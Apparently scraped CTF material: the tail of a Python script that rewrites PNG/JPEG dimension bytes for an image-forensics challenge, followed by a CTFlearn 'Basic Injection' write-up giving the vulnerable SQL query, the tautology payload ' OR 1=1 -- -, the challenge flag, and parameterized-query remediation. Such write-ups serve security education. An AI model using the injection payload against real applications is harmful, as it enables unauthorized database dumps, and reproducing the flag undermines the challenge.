str(hex(height))[2:].zfill(4) if str(org_width)[2:] != new_width: logger.info("New width: %d px" % int(new_width, 16)) if str(org_height)[2:] != new_height: logger.info("New height: %d px" % int(new_height, 16)) # Set width bin_arr[offset1] = int(str(new_width)[:2], 16) bin_arr[offset1 + 1] = int(str(new_width)[2:], 16) # Set height bin_arr[offset2] = int(str(new_height)[:2], 16) bin_arr[offset2 + 1] = int(str(new_height)[2:], 16) logger.info("Saving new image file") with open(output, "wb") as binary_file: binary_file.write(b"".join([(x).to_bytes(1, "big") for x in bin_arr])) logger.info("Image saved!") def modify_png(filename, output, width, height): modify_file(18, 22, filename, output, width, height) # Fix crc32 checksum logger.info("Fixing checksum of new image") call(["pngcsum", "%s" % output, output + "new"]) logger.info("Checksum now OK") os.remove("%s" % output) os.rename("%snew" % output, output) def modify_jpg(filename, output, width, height): bin_arr = [] with open(filename, "rb") as f: arr = f.read() prev = "" i = 0 for b in arr: if prev + hex(b)[2:] == "ffc0": break i += 1 prev = hex(b)[2:] logger.info("Found magic bytes on offset %d " % i) modify_file(i + 6, i + 4, filename, output, width, height) def process_file(filename, output, width, height): kind = filetype.guess(filename) if kind is None: print("Filetype not supported!") return if kind.mime == "image/png": logger.info("Detected: png") modify_png(filename, output, width, height) elif kind.mime == "image/jpeg": logger.info("Detected: jpg") modify_jpg(filename, output, width, height) else: logger.info("Filetype not supported") process_file(args.file, args.output, args.width, args.height)
title: Abandoned Place

content: See if you can leak the whole database using what you know about SQL Injections. TL;DR Basic Injection is a fundamental web exploitation challenge demonstrating classic SQL Injection. The backend query incorporates user input directly via string concatenation without parameterization. Submitting a tautology payload (' OR 1=1 -- -) forces the SQL statement to evaluate to true for every record in the table, dumping the entire database contents and revealing the flag.
title: Basic Injection

content: Initial Analysis Opening the target application presents a simple query form that takes a user’s name: The interface discloses the underlying SQL statement structure: SELECT * FROM webfour.webfour WHERE name = '$input'
title: Basic Injection

content: Vulnerability Identification The core flaw is that $input is directly interpolated into the SQL command string without using prepared statements or input sanitization. This allows an attacker to break out of the string literal delimiter (') and inject arbitrary SQL syntax.
title: Basic Injection

content: Exploitation We construct a classic tautological SQL injection payload: ' OR 1=1 -- -
title: Basic Injection

content: Payload Breakdown ' terminates the initial string literal for the name column. OR 1=1 introduces a boolean condition that always evaluates to TRUE. -- - comments out the trailing single quote and the remainder of the original query. When the database engine processes the concatenated query: SELECT * FROM webfour.webfour WHERE name = '' OR 1=1 -- -'; Because the WHERE condition resolves to TRUE for every row, the database bypasses filtering and outputs all records stored within webfour.webfour. Submitting the payload dumps the complete table, exposing the flag.
title: Basic Injection

content: Flag CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
title: Basic Injection

content: Remediation To prevent SQL Injection vulnerabilities, developers should: Use Parameterized Queries (Prepared Statements): $stmt = $pdo->prepare('SELECT * FROM webfour.webfour WHERE name = :name'); $stmt->execute(['name' => $input]); $results = $stmt->fetchAll(); Apply Principle of Least Privilege: Restrict database user accounts so they only have access to specific schemas and tables required for standard operations.
title: Basic Injection
